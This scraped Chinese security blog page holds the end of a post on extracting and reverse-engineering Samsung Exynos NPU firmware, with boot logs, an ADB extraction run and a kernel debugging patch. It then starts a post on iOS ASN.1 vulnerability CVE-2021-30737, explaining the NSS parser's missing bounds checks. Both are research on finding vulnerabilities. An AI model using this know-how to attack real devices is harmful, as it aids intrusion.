<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[123.007254] NPU:[*]npu_debug_open(221):start <span class="keyword">in</span> npu_debug open</span><br><span class="line">[123.007264] NPU:[*]npu_debug_open(222):complete <span class="keyword">in</span> npu_debug open</span><br><span class="line">[123.007269] NPU:[*]npu_log_open(1152):start <span class="keyword">in</span> npu_log_open</span><br><span class="line">[123.007274] NPU:[*]npu_log_open(1153):complete <span class="keyword">in</span> npu_log_open</span><br><span class="line">[123.007279] NPU:[*]npu_util_memdump_open(317):start <span class="keyword">in</span> npu_util_memdump_open</span><br><span class="line">[123.007282] NPU:[*]npu_util_memdump_open(342):complete <span class="keyword">in</span> npu_util_memdump_open</span><br><span class="line">[123.007820] NPU:[*]npu_system_resume(346):wake_lock, now(1)</span><br><span class="line">[123.007827] NPU:[*]npu_system_alloc_fw_dram_log_buf(93):start: initialization.</span><br><span class="line">[123.009277] NPU:[*]npu_system_alloc_fw_dram_log_buf(103):DRAM <span class="built_in">log</span> buffer <span class="keyword">for</span> firmware: size(2097152) / dv(0x0000000080000000) / kv(ffffff803db75000)</span><br><span class="line">[123.009293] NPU:[*]npu_store_log_init(216):Store <span class="built_in">log</span> memory initialized : ffffff803db75000[Len = 2097152]</span><br><span class="line">[123.009303] NPU:[*]npu_fw_test_initialize(290):fw_test : initialized.</span><br><span class="line">[123.009309] NPU:[*]npu_system_alloc_fw_dram_log_buf(125):complete : initialization.</span><br><span class="line">[123.009315] NPU:[*]npu_firmware_load(540):Firmware load : Start</span><br><span class="line">[123.023161] NPU:[*]__npu_binary_read(215):success of binay(npu/NPU.bin, 475349) apply.</span><br><span class="line">[123.023196] NPU:[*]print_fw_signature(111):NPU Firmware signature : 009:094 2019/04/25 14:56:44</span><br><span class="line">[123.023210] NPU:[*]npu_firmware_load(572):complete <span class="keyword">in</span> npu_firmware_load</span><br><span class="line">[123.023233] NPU:[*]print_iomem_area(466):\x01c(TCU_SRAM) Phy(0x19200000)-(0x19280000) Virt(ffffff802b900000) Size(524288)</span><br><span class="line">[123.023243] NPU:[*]print_iomem_area(466):\x01c(IDP_SRAM) Phy(0x19300000)-(0x19400000) Virt(ffffff802ba00000) Size(1048576)</span><br><span class="line">[123.023251] NPU:[*]print_iomem_area(466):\x01c(SFR_NPU0) Phy(0x17900000)-(0x17a00000) Virt(ffffff802bc00000) Size(1048576)</span><br><span class="line">[123.023259] NPU:[*]print_iomem_area(466):\x01c(SFR_NPU1) Phy(0x17a00000)-(0x17af0000) Virt(ffffff802be00000) Size(983040)</span><br><span class="line">[123.023270] NPU:[*]print_iomem_area(466):\x01c( PMU_NPU) Phy(0x15861d00)-(0x15861e00) Virt(ffffff8010eedd00) Size(256)</span><br><span class="line">[123.023279] NPU:[*]print_iomem_area(466):\x01c(PMU_NCPU) Phy(0x15862f00)-(0x15863000) Virt(ffffff8010ef5f00) Size(256)</span><br><span class="line">[123.023288] NPU:[*]print_iomem_area(466):\x01c(MBOX_SFR) Phy(0x178b0000)-(0x178b017c) Virt(ffffff8010efd000) Size(380)</span><br><span class="line">[123.023367] NPU:[*]npu_cpu_on(729):start <span class="keyword">in</span> npu_cpu_on</span><br><span class="line">[123.023420] NPU:[*]npu_cpu_on(736):complete <span class="keyword">in</span> npu_cpu_on</span><br><span class="line">[123.023445] NPU:[*]npu_system_soc_resume(513):CLKGate1_DRCG_EN_write_enable</span><br><span class="line">[123.023451] NPU:[*]CLKGate4_IP_HWACG_qch_disable(261):start CLKGate4_IP_HWACG_qch_disable</span><br><span class="line">[123.024797] NPU <span class="built_in">log</span> <span class="built_in">sync</span> [60544]</span><br><span class="line">[123.024894] NPU:[*]npu_system_soc_resume(525):CLKGate5_IP_DRCG_EN_write_enable</span><br><span class="line">[123.025842] NPU:[*]mailbox_init(46):mailbox initialize: start, header base at ffffff802b97ff7c</span><br><span class="line">[123.025852] NPU:[*]mailbox_init(47):mailbox initialize: <span class="built_in">wait</span> <span class="keyword">for</span> firmware boot signature.</span><br><span class="line">[123.036810] NPU:[*]mailbox_init(53):header signature \x09: C0FFEE0</span><br><span class="line">[123.036821] NPU:[*]mailbox_init(76):header version \x09: 00060004</span><br><span class="line">[123.036826] NPU:[*]mailbox_init(83):init. success <span class="keyword">in</span> NPU mailbox</span><br><span class="line">[123.036831] NPU:[*]npu_device_runtime_resume(582):npu_device_runtime_resume():0</span><br></pre></td></tr></table></figure>

<h2 id="固件提取及逆向工程"><a href="#固件提取及逆向工程" class="headerlink" title="固件提取及逆向工程"></a>固件提取及逆向工程</h2><p>有两种不同的固件，主要时依赖于NPU使用的CPU类型：</p>
<ul>
<li>Exynos 9820 SoCs (Galaxy S10 models) 使用ARMv7 Cortex-M cores.</li>
<li>Exynos 990 SoCs (Galaxy S20 models) 使用ARMv7 Cortex-A cores.</li>
</ul>
<p>两种固件在实现上十分相似，但是还是存在不同，主要时在初始化时，本文主要研究ARMv7 Cortex-A。</p>
<p>根据前文提到的，固件主要可以从以下三个地方获取：</p>
<ul>
<li><code>/data/NPU.bin</code></li>
<li><code>/vendor/firmware/NPU.bin</code></li>
<li><code>npu/NPU.bin</code> (从内核镜像中提取)</li>
</ul>
<p>在S20 中，NPU固件内嵌于内核镜像中，可以在root后的设备上，使用脚本<a target="_blank" rel="noopener" href="https://github.com/LongtermSecurityInc/samsung-npu/blob/main/tools/npu_firmware_extractor/npu_firmware_extractor.py">npu_firmware_extractor.py</a>进行提取，参数为 <code>--cortex-a</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python3 npu_firmware_extractor.py -d . --cortex-a</span><br><span class="line">[+] Connection to the device using ADB.</span><br><span class="line">[+] Pulling the kernel from the device to the host.</span><br><span class="line">[+] Extracting the firmware.</span><br><span class="line">[+] Done.</span><br><span class="line">$ ll</span><br><span class="line">-rw-r--r--  1 lyte  staff   464K  4 jan 16:30 NPU.bin</span><br><span class="line">-rw-r--r--  1 lyte  staff    55M  4 jan 16:30 boot.img</span><br><span class="line">-rw-r--r--  1 lyte  staff   3,6K  4 jan 16:29 npu_firmware_extractor.py</span><br></pre></td></tr></table></figure>

<p>也可以dump NPU固件分配的SRAM内存。此前，我们查看了不同的debugfs项。除此之外，SRAM-TCU也可以用于在运行时dumpNPU代码和数据。这个文件在S10上可以用，但是在S20上打开将会导致内核崩溃。</p>
<p>解决这个问题的办法是重新编译一个新版本的内核版本。</p>
<p>以下的补丁将解决这个问题。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/drivers/vision/npu/core/npu-util-memdump.c b/drivers/vision/npu/core/npu-util-memdump.c</span><br><span class="line">index <span class="number">5711</span>bbb.<span class="number">.8749701</span> <span class="number">100755</span></span><br><span class="line">--- a/drivers/vision/npu/core/npu-util-memdump.c</span><br><span class="line">+++ b/drivers/vision/npu/core/npu-util-memdump.c</span><br><span class="line">@@ <span class="number">-109</span>,<span class="number">12</span> <span class="number">+109</span>,<span class="number">13</span> @@ <span class="function"><span class="type">int</span> <span class="title">ram_dump_fault_listner</span><span class="params">(<span class="keyword">struct</span> npu_device *npu)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">npu_system</span> *system = &amp;npu-&gt;system;</span><br><span class="line">-   u32 *tcu_dump_addr = <span class="built_in">kzalloc</span>(system-&gt;tcu_sram.size, GFP_ATOMIC);</span><br><span class="line">+   u32 *tcu_dump_addr = <span class="built_in">kzalloc</span>(system-&gt;fw_npu_memory_buffer-&gt;size, GFP_ATOMIC);</span><br><span class="line">    u32 *idp_dump_addr = <span class="built_in">kzalloc</span>(system-&gt;idp_sram.size, GFP_ATOMIC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcu_dump_addr) &#123;</span><br><span class="line">-       <span class="built_in">memcpy_fromio</span>(tcu_dump_addr, system-&gt;tcu_sram.vaddr, system-&gt;tcu_sram.size);</span><br><span class="line">-       <span class="built_in">pr_err</span>(<span class="string">&quot;NPU TCU SRAM dump - %pK / %paB\n&quot;</span>, tcu_dump_addr, &amp;system-&gt;tcu_sram.size);</span><br><span class="line">+       <span class="built_in">memcpy_fromio</span>(tcu_dump_addr, system-&gt;fw_npu_memory_buffer-&gt;vaddr,</span><br><span class="line">+           system-&gt;fw_npu_memory_buffer-&gt;size);</span><br><span class="line">+       <span class="built_in">pr_err</span>(<span class="string">&quot;NPU TCU SRAM dump - %pK / %paB\n&quot;</span>, tcu_dump_addr, &amp;system-&gt;fw_npu_memory_buffer-&gt;size);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">pr_err</span>(<span class="string">&quot;tcu_dump_addr is NULL\n&quot;</span>);</span><br><span class="line">        ret= -ENOMEM;</span><br><span class="line">@@ <span class="number">-281</span>,<span class="number">20</span> <span class="number">+282</span>,<span class="number">22</span> @@ <span class="built_in">DECLARE_NPU_SRAM_DUMP</span>(idp);</span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">npu_util_memdump_probe</span><span class="params">(<span class="keyword">struct</span> npu_system *system)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="built_in">BUG_ON</span>(!system);</span><br><span class="line">-   <span class="built_in">BUG_ON</span>(!system-&gt;tcu_sram.vaddr);</span><br><span class="line">+   <span class="built_in">BUG_ON</span>(!system-&gt;fw_npu_memory_buffer-&gt;vaddr);</span><br><span class="line"> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_NPU_LOOPBACK</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="built_in">atomic_set</span>(&amp;npu_memdump.registered, <span class="number">0</span>);</span><br><span class="line">-   npu_memdump.tcu_sram = system-&gt;tcu_sram;</span><br><span class="line">+   npu_memdump.tcu_sram.vaddr = system-&gt;fw_npu_memory_buffer-&gt;vaddr;</span><br><span class="line">+   npu_memdump.tcu_sram.paddr = system-&gt;fw_npu_memory_buffer-&gt;paddr;</span><br><span class="line">+   npu_memdump.tcu_sram.size = system-&gt;fw_npu_memory_buffer-&gt;size;</span><br><span class="line">    npu_memdump.idp_sram = system-&gt;idp_sram;</span><br><span class="line">-   <span class="built_in">probe_info</span>(<span class="string">&quot;%s: paddr = %08x\n&quot;</span>, FW_MEM_LOG_NAME,</span><br><span class="line">-          system-&gt;tcu_sram.paddr + MEM_LOG_OFFSET</span><br><span class="line">+   <span class="built_in">probe_info</span>(<span class="string">&quot;%s: paddr = %08llx\n&quot;</span>, FW_MEM_LOG_NAME,</span><br><span class="line">+          system-&gt;fw_npu_memory_buffer-&gt;paddr + MEM_LOG_OFFSET</span><br><span class="line">           );</span><br><span class="line"> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_EXYNOS_NPU_DEBUG_SRAM_DUMP</span></span><br><span class="line">-   <span class="built_in">probe_info</span>(<span class="string">&quot;%s: paddr = %08x\n&quot;</span>, TCU_SRAM_DUMP_SYSFS_NAME,</span><br><span class="line">-       system-&gt;tcu_sram.paddr);</span><br><span class="line">-   tcu_sram_dump_size = system-&gt;tcu_sram.size;</span><br><span class="line">+   <span class="built_in">probe_info</span>(<span class="string">&quot;%s: paddr = %08llx\n&quot;</span>, TCU_SRAM_DUMP_SYSFS_NAME,</span><br><span class="line">+       system-&gt;fw_npu_memory_buffer-&gt;paddr);</span><br><span class="line">+   tcu_sram_dump_size = system-&gt;fw_npu_memory_buffer-&gt;size;</span><br><span class="line">    <span class="built_in">probe_info</span>(<span class="string">&quot;%s: paddr = %08x\n&quot;</span>, IDP_SRAM_DUMP_SYSFS_NAME,</span><br><span class="line">        system-&gt;idp_sram.paddr);</span><br><span class="line">    idp_sram_dump_size = system-&gt;idp_sram.size;</span><br></pre></td></tr></table></figure>

<h2 id="NPU操作系统"><a href="#NPU操作系统" class="headerlink" title="NPU操作系统"></a>NPU操作系统</h2><p>待续</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/04/11/iOS-ASN-1-%E6%BC%8F%E6%B4%9E-CVE-2021-30737/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/11/iOS-ASN-1-%E6%BC%8F%E6%B4%9E-CVE-2021-30737/" class="post-title-link" itemprop="url">iOS ASN.1 漏洞(CVE-2021-30737)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-04-11 19:47:59" itemprop="dateCreated datePublished" datetime="2022-04-11T19:47:59+08:00">2022-04-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-04-13 21:40:26" itemprop="dateModified" datetime="2022-04-13T21:40:26+08:00">2022-04-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="ASN-1编码"><a href="#ASN-1编码" class="headerlink" title="ASN.1编码"></a>ASN.1编码</h2><p>ASN.1是一种Type-Length-Value序列化格式，ASN.1有一个特性，即，如果不知道值的长度，ASN.1仍能对它进行序列化，但是需要ASN.1按照基本编码规则(BER)进行编码。有一种更严格的编码叫区分编码规则(DER)，它强制要求一个特定的值只有一个正确的编码，并且不允许在不知道最终长度的情况下序列化值。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://luca.ntop.org/Teaching/Appunti/asn1.html">ASN.1指南</a></p>
</blockquote>
<p>这里仅介绍漏洞所需的ASN.1知识。</p>
<p>第一个是类型，其中5位定义了类型标识符。0x1f表示类型标识符不能在这5位中表示，需要其他的表示方法，而是以不同的方式进行编码。</p>
<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJvKMxjksjyIsG6m0LKukaFNjF_NRfiFDS4-rC8jg9smNCsH9emMFDKFncfg18NZxl0HWhsxa-FED-djCqDY7OdDF8-LRDdsGgz8S80Dx4r35EaIG_nYI_I78lbgnY_eQjayHZYpt1jA-O3MaCyOnHAfSjRNAz1L3pCwkSlvpNe9qrHrYwGUHWZaknCA/s600/image6%20%281%29.png" alt="Diagram showing first two bytes of a serialized ASN.1 object. The first byte in this case is the type and class identifier and the second is the length."></p>
<p>第一个字节的前两位表示该类型的类别：universal、application、content-specific或private。对我们来说，设置为0（universal）。</p>
<p>第6位如果为1，就说明这是一个原始编码，也就是说，在长度后面是可以直接解释为预定类型的内容。例如，作为ASN.1可打印字符串的 “HELLO”的原始编码将有一个长度为5的字节，后面是ASCII字符 “HELLO”。</p>
<p>第6位的值为0，表示这是一个构建的编码。这意味着长度后面的字节是一个或多个 “块 “的ASN.1编码，需要单独解析和串联以形成最终的输出值。还可以指定一个长度值为0，这意味着甚至不知道重建的输出会有多长，或者需要多少后续输入来完全建立输出。</p>
<p>这种最后的情况（长度不确定的构造类型）被称为不确定的形式。构成单个不确定值的输入的结束是由一个序列化的类型发出的信号，该类型的标识符、构造、类和长度值都等于0，它被编码为两个NULL字节。</p>
<h2 id="ASN-1-bitstrings"><a href="#ASN-1-bitstrings" class="headerlink" title="ASN.1 bitstrings"></a>ASN.1 bitstrings</h2><p>大多数ASN.1字符串类型不需要特殊处理，只是原始字节。它们中的一些有长度限制。例如：BMP字符串必须是偶数长度，UNIVERSAL字符串的长度必须是4字节的倍数，但仅此而已。</p>
<p>ASN.1比特串是比特的字符串，而不是字节的字符串。例如，可以有一个长度为一个比特的比特串（所以要么是0，要么是1）或者一个长度为127比特的比特串（所以是15个完整的字节加上一个额外的7比特。）</p>
<p>编码后的ASN.1比特串在长度之后、内容之前有一个额外的元数据字节，它编码了最后一个字节中未使用的比特数。</p>
<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLFuO8lb9EEiWHIAHNFcZQGqIWDtJ-V8DVI8GZC2Bc0d1qsrM3SugjE8dkb2z1IXa86wWlUiPJ4X0PquX_Vozl_6oJUNT9dU0LMgNh1x4L86-cjKpRuDpQdPRPbyp-Rmu0gbipzRY9XRmQz5q_7ZfmXW4MJ_6YcR735HO0YngIFvrYyjymoiwKYmP9RA/s600/image1%20%282%29.png" alt="Diagram showing the complete encoding of a 3-bit bitstring. The length of 2 includes the unused-bits count byte which has a value of 5, indicating that only the 3 most-significant bits of the final byte are valid."></p>
<h2 id="ASN-1解析"><a href="#ASN-1解析" class="headerlink" title="ASN.1解析"></a>ASN.1解析</h2><p>ASN.1数据总是需要与模板一起解码，模板告诉解析器应该期待什么数据，还提供输出指针，以填入解析后的输出数据。下面是一个例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> SecAsn1Template simple_bitstring_template[] = &#123;</span><br><span class="line">  &#123;</span><br><span class="line">    SEC_ASN1_BIT_STRING | SEC_ASN1_MAY_STREAM, <span class="comment">// kind: bit string,</span></span><br><span class="line">                                               <span class="comment">//  may be constructed</span></span><br><span class="line">    <span class="number">0</span>,     <span class="comment">// offset: in dest/src</span></span><br><span class="line">    <span class="literal">NULL</span>,  <span class="comment">// sub: subtemplate for indirection</span></span><br><span class="line">    <span class="keyword">sizeof</span>(SecAsn1Item) <span class="comment">// size: of output structure</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SecAsn1Item decoded = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">PLArenaPool* pool = PORT_NewArena(<span class="number">1024</span>);</span><br><span class="line">SECStatus status =</span><br><span class="line">  SEC_ASN1Decode(pool,     <span class="comment">// pool: arena for destination allocations</span></span><br><span class="line">                 &amp;decoded, <span class="comment">// dest: decoded encoded items in to here</span></span><br><span class="line">                 &amp;simple_bitstring_template, <span class="comment">// template</span></span><br><span class="line">                 asn1_bytes,      <span class="comment">// buf: asn1 input bytes</span></span><br><span class="line">                 asn1_bytes_len); <span class="comment">// len: input size</span></span><br></pre></td></tr></table></figure>

<h2 id="NSS-ASN-1-状态机"><a href="#NSS-ASN-1-状态机" class="headerlink" title="NSS ASN.1 状态机"></a>NSS ASN.1 状态机</h2><p>该状态机有两个核心数据结构。</p>
<p>-<br>  SEC_ASN1DecoderContext - 整体的解析环境。</p>
<ul>
<li>sec_asn1d_state - 一个单一的解析器状态，保存在一个双链接的列表中，形成一个嵌套状态的堆栈。</li>
</ul>
<p>部分字段如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sec_asn1d_state_struct</span> &#123;</span></span><br><span class="line">  SEC_ASN1DecoderContext *top; </span><br><span class="line">  <span class="type">const</span> SecAsn1Template *theTemplate;</span><br><span class="line">  <span class="type">void</span> *dest;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sec_asn1d_state_struct</span> *<span class="title">parent</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sec_asn1d_state_struct</span> *<span class="title">child</span>;</span></span><br><span class="line">  sec_asn1d_parse_place place;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> contents_length;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> pending;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> consumed;</span><br><span class="line">  <span class="type">int</span> depth;</span><br><span class="line">&#125; sec_asn1d_state;</span><br></pre></td></tr></table></figure>

<p>解析状态机的主要引擎是SEC_ASN1DecoderUpdate方法，它接收一个上下文对象、原始输入缓冲区和长度：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SECStatus</span><br><span class="line"><span class="title function_">SEC_ASN1DecoderUpdate</span> <span class="params">(SEC_ASN1DecoderContext *cx,</span></span><br><span class="line"><span class="params">                       <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">size_t</span> len)</span></span><br></pre></td></tr></table></figure>

<p>当前状态存储在上下文对象的current字段中，而该当前状态的place字段决定了解析器当前所处的状态，这些状态字段如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    beforeIdentifier,</span><br><span class="line">    duringIdentifier,</span><br><span class="line">    afterIdentifier,</span><br><span class="line">    beforeLength,</span><br><span class="line">    duringLength,</span><br><span class="line">    afterLength,</span><br><span class="line">    beforeBitString,</span><br><span class="line">    duringBitString,</span><br><span class="line">    duringConstructedString,</span><br><span class="line">    duringGroup,</span><br><span class="line">    duringLeaf,</span><br><span class="line">    duringSaveEncoding,</span><br><span class="line">    duringSequence,</span><br><span class="line">    afterConstructedString,</span><br><span class="line">    afterGroup,</span><br><span class="line">    afterExplicit,</span><br><span class="line">    afterImplicit,</span><br><span class="line">    afterInline,</span><br><span class="line">    afterPointer,</span><br><span class="line">    afterSaveEncoding,</span><br><span class="line">    beforeEndOfContents,</span><br><span class="line">    duringEndOfContents,</span><br><span class="line">    afterEndOfContents,</span><br><span class="line">    beforeChoice,</span><br><span class="line">    duringChoice,</span><br><span class="line">    afterChoice,</span><br><span class="line">    notInUse</span><br><span class="line">&#125; sec_asn1d_parse_place;</span><br></pre></td></tr></table></figure>

<p>状态机通过switch进行判断：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (state-&gt;place) &#123;</span><br><span class="line">    <span class="keyword">case</span> beforeIdentifier:</span><br><span class="line">      consumed = sec_asn1d_parse_identifier(state, buf, len);</span><br><span class="line">      what = SEC_ASN1_Identifier;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> duringIdentifier:</span><br><span class="line">      consumed = sec_asn1d_parse_more_identifier(state, buf, len);</span><br><span class="line">      what = SEC_ASN1_Identifier;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> afterIdentifier:</span><br><span class="line">      sec_asn1d_confirm_identifier(state);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>每个可以消耗输入的状态方法，都会被传递一个指向原始输入缓冲区中下一个未消耗的字节的指针（buf）和一个剩余未消耗的字节数（len）。然后这些方法返回他们所消耗的输入量，并通过更新上下文对象的状态字段来发出任何错误信号。</p>
<p>解析器可以是递归的：一个状态可以把它的-&gt;place字段设置为一个期望处理解析的子状态的状态，然后分配一个新的子状态。例如，当解析一个ASN.1序列时。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">state-&gt;place = duringSequence;</span><br><span class="line">state = sec_asn1d_push_state(state-&gt;top, state-&gt;theTemplate + <span class="number">1</span>,</span><br><span class="line">                              state-&gt;dest, PR_TRUE);</span><br></pre></td></tr></table></figure>

<p>当前状态将自己的下一个状态设置为 duringSequence，然后调用 sec_asn1d_push_state，它分配了一个新的状态对象，有一个新的模板和一个父代的 dest 字段的副本。</p>
<p>sec_asn1d_push_state会更新上下文的当前字段，这样一来，SEC_ASN1DecoderUpdate的下一个循环就会把这个子状态视为当前状态。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cx-&gt;current = new_state;</span><br></pre></td></tr></table></figure>

<p>新分配的子的位置字段（决定当前状态）的初始值由模板决定。然后，该子代所遵循的状态机路径中的最终状态将负责将自己从状态堆栈中弹出，以便其父代可以到达 duringSequence 状态，以消费子代的结果。</p>
<h2 id="缓冲区管理"><a href="#缓冲区管理" class="headerlink" title="缓冲区管理"></a>缓冲区管理</h2><p>缓冲区管理是NSS ASN.1解析器开始变得非常令人费解的地方。如果你仔细阅读代码，你会注意到当输出缓冲区被填入时极度缺乏边界检查–基本上没有。例如，sec_asn1d_parse_leaf将原始编码的字符串字节复制到输出缓冲区中，但没有对字符串的长度与缓冲区的大小进行界限检查。</p>
<p>与其使用明确的边界检查来确保长度有效，不如依靠这样的事实来实现内存安全，即有效的ASN.1解码永远不会产生大于其输入的输出。</p>
<p>也就是说，没有任何形式的解压或输入扩展，所以任何解析的输出数据必须等于或短于编码它的输入。NSS利用这一点，将所有的输出缓冲区过度分配，使其与输入一样大。</p>
<p>对于原始字符串来说，这是很简单的：长度和输入都是提供的，所以实际上没有什么可以出错的。但是对于构造字符串来说，这就有点麻烦了……</p>
<p>构建字符串的一种方式是将其视为子字符串的树，最多嵌套32层。这里有一个例子。</p>
